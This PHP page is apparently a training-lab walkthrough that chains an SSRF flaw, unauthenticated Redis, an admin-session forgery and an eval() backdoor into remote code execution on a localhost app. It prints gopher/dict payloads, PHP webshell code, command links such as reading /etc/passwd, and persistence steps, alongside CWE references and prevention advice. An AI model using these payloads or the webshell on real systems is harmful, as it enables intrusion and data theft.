<?php
// attack_walkthrough.php - Step-by-step attack demonstration
?>
<!DOCTYPE html>
<html>
<head>
    <title>Complete Attack Walkthrough: Zero to System Owner</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;700&family=Roboto:wght@300;400;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1300px;
            margin: 0 auto;
            padding: 20px;
        }
        
        h1 { 
            font-size: 3.5em; 
            margin-bottom: 20px;
            color: #00d4ff;
            text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
            font-family: 'Roboto Mono', monospace;
            text-align: center;
            margin-top: 30px;
        }
        
        h2 { 
            color: #00ff9d; 
            margin: 40px 0 20px;
            border-bottom: 3px solid #00ff9d;
            padding-bottom: 10px;
            font-size: 2.2em;
        }
        
        h3 { 
            color: #ff6b9d; 
            margin: 25px 0 15px;
            font-size: 1.6em;
        }
        
        .step {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 30px;
            margin: 30px 0;
            border: 2px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }
        
        .step-number {
            position: absolute;
            top: 20px;
            left: 20px;
            background: #ff0080;
            color: white;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1.8em;
            box-shadow: 0 5px 15px rgba(255, 0, 128, 0.5);
        }
        
        .step-content {
            margin-left: 80px;
        }
        
        .code-block {
            background: #1a1a2e;
            border: 2px solid #00d4ff;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Roboto Mono', monospace;
            overflow-x: auto;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        
        .demo-box {
            background: rgba(0, 212, 255, 0.1);
            border: 2px solid #00d4ff;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
        }
        
        .danger-box {
            background: rgba(255, 107, 157, 0.1);
            border: 2px solid #ff6b9d;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
        }
        
        .success-box {
            background: rgba(0, 255, 157, 0.1);
            border: 2px solid #00ff9d;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
        }
        
        .demo-link {
            display: inline-block;
            background: linear-gradient(45deg, #ff0080, #00d4ff);
            color: white;
            padding: 12px 25px;
            border-radius: 50px;
            text-decoration: none;
            margin: 10px;
            font-weight: bold;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
        }
        
        .demo-link:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(255, 0, 128, 0.4);
        }
        
        .nav-buttons {
            position: fixed;
            bottom: 30px;
            right: 30px;
            display: flex;
            gap: 15px;
            z-index: 1000;
        }
        
        .nav-btn {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            font-size: 1.5em;
            cursor: pointer;
            transition: all 0.3s;
            backdrop-filter: blur(5px);
        }
        
        .nav-btn:hover {
            background: rgba(0, 212, 255, 0.5);
            transform: scale(1.1);
        }
        
        .attack-flow {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 40px 0;
            padding: 20px;
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
        }
        
        .flow-step {
            text-align: center;
            flex: 1;
        }
        
        .flow-arrow {
            color: #00ff9d;
            font-size: 2em;
            margin: 0 20px;
        }
        
        .user-type {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            margin-right: 10px;
        }
        
        .normal-user { background: #2196f3; color: white; }
        .attacker { background: #ff9800; color: black; }
        .admin { background: #f44336; color: white; }
        
        .terminal {
            background: #000;
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Roboto Mono', monospace;
            margin: 20px 0;
            overflow-x: auto;
        }
        
        .terminal-line {
            margin: 5px 0;
            white-space: nowrap;
        }
        
        .terminal-prompt {
            color: #00ff00;
        }
        
        .terminal-command {
            color: #ffffff;
        }
        
        .terminal-output {
            color: #00d4ff;
        }
        
        .terminal-comment {
            color: #888;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Complete Attack Walkthrough</h1>
    <p style="text-align: center; font-size: 1.3em; color: #00ff9d; margin-bottom: 40px;">
        From Normal User → Admin Privileges → Remote Code Execution → System Compromise
    </p>
    
    <div class="attack-flow">
        <div class="flow-step">
            <div style="font-size: 3em; margin-bottom: 10px;">👤</div>
            <h3>Normal User</h3>
            <p>Limited access</p>
        </div>
        <div class="flow-arrow">→</div>
        <div class="flow-step">
            <div style="font-size: 3em; margin-bottom: 10px;">🔓</div>
            <h3>Admin Access</h3>
            <p>Privilege escalation</p>
        </div>
        <div class="flow-arrow">→</div>
        <div class="flow-step">
            <div style="font-size: 3em; margin-bottom: 10px;">💾</div>
            <h3>Webshell</h3>
            <p>Code injection</p>
        </div>
        <div class="flow-arrow">→</div>
        <div class="flow-step">
            <div style="font-size: 3em; margin-bottom: 10px;">⚡</div>
            <h3>RCE</h3>
            <p>Command execution</p>
        </div>
        <div class="flow-arrow">→</div>
        <div class="flow-step">
            <div style="font-size: 3em; margin-bottom: 10px;">👑</div>
            <h3>System Owner</h3>
            <p>Full compromise</p>
        </div>
    </div>

    <!-- Step 1: Normal User Registration -->
    <div class="step">
        <div class="step-number">1</div>
        <div class="step-content">
            <h3><span class="user-type normal-user">Normal User</span> Account Creation</h3>
            <p>Start with no special privileges - just a regular registered user.</p>
            
            <div class="demo-box">
                <h4>👤 Create Normal Account:</h4>
                <p>Register as a regular user with no admin privileges:</p>
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">Visit: http://localhost:8080/register.php</span>
                    </div>
                    <div class="terminal-line terminal-comment"># Fill registration form:</div>
                    <div class="terminal-line terminal-output">Username: attacker123</div>
                    <div class="terminal-line terminal-output">Password: Passw0rd123!</div>
                    <div class="terminal-line terminal-output">Role: user (default)</div>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="register.php" target="_blank" class="demo-link">🔗 Register Now</a>
                    <a href="login.php" target="_blank" class="demo-link">🔐 Login</a>
                </div>
            </div>
            
            <div class="code-block">
                <h4>📁 What We Have:</h4>
                <pre style="color: #00ff9d;">
User Profile:
- Username: attacker123
- Role: user (NOT admin)
- Permissions: Basic note management
- Access: Cannot view admin panel

Current Limitations:
❌ No admin panel access
❌ Cannot view other users' data  
❌ Limited to basic features
❌ No system access</pre>
            </div>
        </div>
    </div>

    <!-- Step 2: Discovering SSRF -->
    <div class="step">
        <div class="step-number">2</div>
        <div class="step-content">
            <h3><span class="user-type attacker">Attacker</span> Discovers SSRF Vulnerability</h3>
            <p>Find the import_note.php endpoint that accepts URLs without validation.</p>
            
            <div class="danger-box">
                <h4>🔍 Finding the Vulnerability:</h4>
                <p>While exploring the application, we discover the "Import Note from URL" feature:</p>
                
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">Visit: http://localhost:8080/notes.php</span>
                    </div>
                    <div class="terminal-line terminal-comment"># Find "Import Note From URL" feature</div>
                    <div class="terminal-line terminal-output">Found endpoint: import_note.php</div>
                    <div class="terminal-line terminal-output">Parameter: url (unvalidated)</div>
                    <div class="terminal-line terminal-output">Test with: file:///etc/passwd → WORKS!</div>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="notes.php" target="_blank" class="demo-link">📝 Go to Notes</a>
                </div>
            </div>
            
            <div class="code-block">
                <h4>💀 Vulnerable Code:</h4>
                <pre style="color: #ff6b9d;">
// import_note.php - Line 30-35
$url = trim($_POST['url'] ?? '');
// NO VALIDATION HERE!
$content = @file_get_contents($url, false, $ctx);

// Accepts dangerous protocols:
// file:///etc/passwd
// dict://localhost:6379
// gopher://localhost:6379</pre>
            </div>
            
            <p><strong>Impact:</strong> This allows accessing internal services that shouldn't be reachable.</p>
        </div>
    </div>

    <!-- Step 3: Redis Discovery -->
    <div class="step">
        <div class="step-number">3</div>
        <div class="step-content">
            <h3><span class="user-type attacker">Attacker</span> Discovers Redis Service</h3>
            <p>Use SSRF to scan for internal services and find Redis running without authentication.</p>
            
            <div class="danger-box">
                <h4>🔎 Port Scanning via SSRF:</h4>
                <p>Test common ports to discover internal services:</p>
                
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">Test: http://localhost:8080/import_note.php?url=dict://127.0.0.1:6379</span>
                    </div>
                    <div class="terminal-line terminal-output">Response: -ERR unknown command 'http://localhost:8080/'</div>
                    <div class="terminal-line terminal-comment"># Redis responds! Port 6379 is open</div>
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">Test authentication: dict://127.0.0.1:6379/AUTH test</span>
                    </div>
                    <div class="terminal-line terminal-output">Response: -ERR Client sent AUTH, but no password is set</div>
                    <div class="terminal-line terminal-comment"># No password required! Redis is unprotected</div>
                </div>
            </div>
            
            <div class="code-block">
                <h4>🎯 Redis Discovery:</h4>
                <pre style="color: #00ff9d;">
Discovered Services:
✅ Redis: 127.0.0.1:6379
❌ No authentication required
✅ Accepts raw Redis protocol
✅ Can inject arbitrary commands

Attack Vector:
SSRF → Redis Protocol Injection → Arbitrary Data Write</pre>
            </div>
            
            <p><strong>Critical Finding:</strong> Redis accepts commands without authentication, allowing full control.</p>
        </div>
    </div>

    <!-- Step 4: Admin Session Injection -->
    <div class="step">
        <div class="step-number">4</div>
        <div class="step-content">
            <h3><span class="user-type attacker">Attacker</span> Injects Admin Session</h3>
            <p>Use Redis protocol injection to create an admin session cookie.</p>
            
            <div class="danger-box">
                <h4>⚡ Inject Admin Session via SSRF:</h4>
                <p>Send Redis commands through the SSRF vulnerability:</p>
                
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">python3 ssrf_admin_takeover.py</span>
                    </div>
                    <div class="terminal-line terminal-output">[*] SSRF → Redis Admin Takeover Exploit</span>
                    <div class="terminal-line terminal-output">[+] Redis injection attempted</span>
                    <div class="terminal-line terminal-output">[+] Set cookie: SID = admin_from_ssrf</span>
                </div>
                
                <div class="code-block" style="margin-top: 20px;">
                    <h4>🎯 What the script does:</h4>
                    <pre style="color: #ff6b9d;">
# Build Redis RESP command
SET session:admin_from_ssrf '{"user":"admin","role":"admin"}'

# Encode for gopher:// URL
gopher://127.0.0.1:6379/_*3%0d%0a%243%0d%0aSET...

# Send via SSRF
POST /import_note.php
url=gopher://127.0.0.1:6379/_...</pre>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="admin.php" target="_blank" class="demo-link">👑 Access Admin Panel</a>
                </div>
            </div>
            
            <div class="success-box">
                <h4>✅ Result:</h4>
                <p>Now we have an admin session in Redis:</p>
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">redis-cli GET session_admin_from_ssrf</span>
                    </div>
                    <div class="terminal-line terminal-output">{"user":"admin","role":"admin"}</div>
                </div>
                <p><strong>Privilege Escalation Achieved:</strong> Normal user → Admin access!</p>
            </div>
        </div>
    </div>

    <!-- Step 5: Webshell Injection -->
    <div class="step">
        <div class="step-number">5</div>
        <div class="step-content">
            <h3><span class="user-type admin">Admin</span> Injects PHP Webshell</h3>
            <p>Now with admin access, inject PHP code into Redis for later execution.</p>
            
            <div class="danger-box">
                <h4>💾 Store PHP Webshell in Redis:</h4>
                <p>Inject a PHP webshell that will execute system commands:</p>
                
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">python3 set_webshell_demo.py</span>
                    </div>
                    <div class="terminal-line terminal-output">Stored value: &lt;?php echo shell_exec($_GET['cmd'] ?? ''); ?&gt;</span>
                </div>
                
                <div class="code-block" style="margin-top: 20px;">
                    <h4>🎯 Webshell Payload:</h4>
                    <pre style="color: #ff6b9d;">
&lt;?php
if (isset($_GET['cmd'])) {
    echo '&lt;pre&gt;';
    system($_GET['cmd']);
    echo '&lt;/pre&gt;';
}
?&gt;</pre>
                </div>
                
                <p><strong>Key:</strong> The webshell is stored in Redis key: <code>session_webshell_demo</code></p>
            </div>
            
            <div class="code-block">
                <h4>🔍 Verify Injection:</h4>
                <pre style="color: #00ff9d;">
$ redis-cli GET session_webshell_demo
"&lt;?php echo shell_exec(\$_GET['cmd'] ?? ''); ?&gt;"

$ curl http://localhost:8080/admin.php
session_webshell_demo => &lt;?php echo shell_exec($_GET['cmd'] ?? ''); ?&gt;

The PHP code is stored but NOT executed yet...
We need something to EVALuate it!</pre>
            </div>
        </div>
    </div>

    <!-- Step 6: Finding Code Execution Point -->
    <div class="step">
        <div class="step-number">6</div>
        <div class="step-content">
            <h3><span class="user-type admin">Admin</span> Finds Code Execution Vector</h3>
            <p>Discover that admin.php has a hidden eval() that executes Redis content.</p>
            
            <div class="danger-box">
                <h4>🔎 Analyzing Admin Panel:</h4>
                <p>Examine admin.php source code to find execution points:</p>
                
                <div class="code-block">
                    <pre style="color: #ff6b9d;">
// admin.php - Critical vulnerable code
$webshell_content = $redis->get("session_webshell_demo");

if (isset($_GET['execute'])) {
    // ⚠️ DANGEROUS: Executes Redis content!
    eval('?>' . $webshell_content);
}</pre>
                </div>
                
                <p><strong>The Missing Link:</strong> When admin.php is accessed with <code>?execute=eval</code>, it evaluates the Redis content as PHP code!</p>
            </div>
            
            <div class="success-box">
                <h4>🎯 Execution Trigger:</h4>
                <p>Access the admin panel with the execute parameter:</p>
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">Visit: http://localhost:8080/admin.php?execute=eval&cmd=whoami</span>
                    </div>
                    <div class="terminal-line terminal-output">www-data</div>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="admin.php?execute=eval&cmd=whoami" target="_blank" class="demo-link">⚡ Test RCE: whoami</a>
                    <a href="admin.php?execute=eval&cmd=id" target="_blank" class="demo-link">🆔 Test RCE: id</a>
                </div>
            </div>
        </div>
    </div>

    <!-- Step 7: Gaining Full RCE -->
    <div class="step">
        <div class="step-number">7</div>
        <div class="step-content">
            <h3><span class="user-type admin">System Owner</span> Achieves Full RCE</h3>
            <p>Execute arbitrary commands and gain complete system control.</p>
            
            <div class="danger-box">
                <h4>⚡ Remote Code Execution Demo:</h4>
                <p>Now we can execute any system command:</p>
                
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">http://localhost:8080/admin.php?execute=eval&cmd=whoami</span>
                    </div>
                    <div class="terminal-line terminal-output">www-data</div>
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">http://localhost:8080/admin.php?execute=eval&cmd=id</span>
                    </div>
                    <div class="terminal-line terminal-output">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">http://localhost:8080/admin.php?execute=eval&cmd=ls -la /</span>
                    </div>
                    <div class="terminal-line terminal-output">total 84<br>drwxr-xr-x   1 root root 4096 Dec 20 12:34 .<br>drwxr-xr-x   1 root root 4096 Dec 20 12:34 ..<br>drwxr-xr-x   1 root root 4096 Dec 20 12:34 bin<br>...</div>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="admin.php?execute=eval&cmd=ls -la" target="_blank" class="demo-link">📁 List Files</a>
                    <a href="admin.php?execute=eval&cmd=cat /etc/passwd" target="_blank" class="demo-link">👥 View Users</a>
                    <a href="admin.php?execute=eval&cmd=ps aux" target="_blank" class="demo-link">⚙️ Running Processes</a>
                </div>
            </div>
            
            <div class="success-box">
                <h4>✅ Full System Access Achieved:</h4>
                <ul>
                    <li>✅ Execute any system command</li>
                    <li>✅ Read any file on the system</li>
                    <li>✅ List running processes</li>
                    <li>✅ Access databases</li>
                    <li>✅ Install malware/backdoors</li>
                </ul>
            </div>
        </div>
    </div>

    <!-- Step 8: Persistence & Advanced Attacks -->
    <div class="step">
        <div class="step-number">8</div>
        <div class="step-content">
            <h3><span class="user-type admin">System Owner</span> Establishes Persistence</h3>
            <p>Create permanent backdoors and explore the compromised system.</p>
            
            <div class="danger-box">
                <h4>📅 Create Persistent Backdoor:</h4>
                <p>Create a permanent webshell that survives reboots:</p>
                
                <div class="terminal">
                    <div class="terminal-line">
                        <span class="terminal-prompt">$ </span>
                        <span class="terminal-command">http://localhost:8080/admin.php?execute=persist</span>
                    </div>
                    <div class="terminal-line terminal-output">✅ Persistent backdoor created!</span>
                    <div class="terminal-line terminal-output">Access: /backdoor.php?cmd=whoami</span>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <a href="admin.php?execute=persist" target="_blank" class="demo-link">📁 Create Backdoor</a>
                    <a href="backdoor.php?cmd=whoami" target="_blank" class="demo-link">🔗 Access Backdoor</a>
                </div>
            </div>
            
            <div class="code-block">
                <h4>🎯 Advanced Attack Techniques:</h4>
                <pre style="color: #ff6b9d;">
# Lateral Movement
http://localhost:8080/advanced_attacks.php?attack=lateral

# Data Exfiltration  
http://localhost:8080/advanced_attacks.php?attack=exfil

# Persistence Mechanisms
http://localhost:8080/advanced_attacks.php?attack=persistence

# Real attacker would:
1. Create cron job for persistence
2. Steal database credentials
3. Install reverse shell
4. Cover tracks (delete logs)
5. Move to other systems</pre>
            </div>
            
            <div style="text-align: center; margin-top: 20px;">
                <a href="advanced_attacks.php" target="_blank" class="demo-link">🔬 Advanced Attacks</a>
            </div>
        </div>
    </div>

    <!-- Step 9: Complete Attack Chain Summary -->
    <div class="step">
        <div class="step-number">9</div>
        <div class="step-content">
            <h3>🔗 Complete Attack Chain Summary</h3>
            
            <div class="attack-flow" style="background: rgba(0,0,0,0.5);">
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">1️⃣</div>
                    <p><strong>Normal User</strong></p>
                </div>
                <div class="flow-arrow">↓</div>
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">2️⃣</div>
                    <p><strong>Discover SSRF</strong></p>
                </div>
                <div class="flow-arrow">↓</div>
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">3️⃣</div>
                    <p><strong>Find Redis</strong></p>
                </div>
                <div class="flow-arrow">↓</div>
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">4️⃣</div>
                    <p><strong>Inject Admin</strong></p>
                </div>
                <div class="flow-arrow">↓</div>
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">5️⃣</div>
                    <p><strong>Inject Webshell</strong></p>
                </div>
                <div class="flow-arrow">↓</div>
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">6️⃣</div>
                    <p><strong>Find eval()</strong></p>
                </div>
                <div class="flow-arrow">↓</div>
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">7️⃣</div>
                    <p><strong>Gain RCE</strong></p>
                </div>
                <div class="flow-arrow">↓</div>
                <div class="flow-step">
                    <div style="font-size: 2em; margin-bottom: 10px;">8️⃣</div>
                    <p><strong>Full Control</strong></p>
                </div>
            </div>
            
            <div class="grid-2" style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin: 30px 0;">
                <div class="danger-box">
                    <h4>💀 Vulnerabilities Exploited:</h4>
                    <ol>
                        <li><strong>CWE-918:</strong> Server-Side Request Forgery</li>
                        <li><strong>CWE-306:</strong> Missing Authentication for Redis</li>
                        <li><strong>CWE-94:</strong> Code Injection (eval())</li>
                        <li><strong>CWE-77:</strong> Command Injection</li>
                        <li><strong>CWE-862:</strong> Missing Authorization</li>
                    </ol>
                </div>
                
                <div class="success-box">
                    <h4>🛡️ Prevention Measures:</h4>
                    <ul>
                        <li>Validate all URLs in SSRF endpoints</li>
                        <li>Enable Redis authentication</li>
                        <li>Never use eval() on user input</li>
                        <li>Implement proper session management</li>
                        <li>Use network segmentation</li>
                    </ul>
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 40px;">
                <h3>🎓 What We've Demonstrated:</h3>
                <p style="font-size: 1.3em; color: #00ff9d;">
                    How a chain of seemingly minor vulnerabilities can lead to<br>
                    <strong>COMPLETE SYSTEM COMPROMISE</strong>
                </p>
            </div>
        </div>
    </div>

    <!-- Step 10: Live Demo Links -->
    <div class="step">
        <div class="step-number">10</div>
        <div class="step-content">
            <h3>🚀 Try It Yourself!</h3>
            
            <div class="demo-box" style="text-align: center;">
                <h4>🔗 Live Demonstration Links:</h4>
                
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 30px 0;">
                    <div>
                        <h5>👤 User Registration</h5>
                        <a href="register.php" target="_blank" class="demo-link">Register</a>
                        <a href="login.php" target="_blank" class="demo-link">Login</a>
                    </div>
                    
                    <div>
                        <h5>🔍 Discovery Phase</h5>
                        <a href="notes.php" target="_blank" class="demo-link">Find SSRF</a>
                    </div>
                    
                    <div>
                        <h5>👑 Admin Access</h5>
                        <a href="admin.php" target="_blank" class="demo-link">Admin Panel</a>
                    </div>
                    
                    <div>
                        <h5>⚡ RCE Demo</h5>
                        <a href="admin.php?execute=eval&cmd=whoami" target="_blank" class="demo-link">whoami</a>
                        <a href="admin.php?execute=eval&cmd=id" target="_blank" class="demo-link">id</a>
                        <a href="admin.php?execute=eval&cmd=ls -la" target="_blank" class="demo-link">ls -la</a>
                    </div>
                    
                    <div>
                        <h5>🔬 Advanced</h5>
                        <a href="advanced_attacks.php" target="_blank" class="demo-link">Advanced Attacks</a>
                        <a href="backdoor.php" target="_blank" class="demo-link">Backdoor</a>
                    </div>
                    
                    <div>
                        <h5>📊 Presentation</h5>
                        <a href="presentation.php" target="_blank" class="demo-link">Full Presentation</a>
                    </div>
                </div>
                
                <div style="margin-top: 40px; padding-top: 20px; border-top: 2px solid rgba(255,255,255,0.2);">
                    <p style="font-size: 1.5em; color: #00d4ff;">
                        🔥 Complete Attack Chain Demonstrated | 🛡️ Security Lessons Learned
                    </p>
                    <p style="margin-top: 20px;">
                        <strong>Educational Purpose Only</strong> - This demonstrates security concepts in an isolated environment
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="nav-buttons">
    <button class="nav-btn" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">↑</button>
    <a href="presentation.php" target="_blank" class="nav-btn" style="text-decoration: none; display: flex; align-items: center; justify-content: center;">🎤</a>
</div>

<script>
    // Smooth scrolling for navigation
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            document.querySelector(this.getAttribute('href')).scrollIntoView({
                behavior: 'smooth'
            });
        });
    });
</script>

</body>
</html>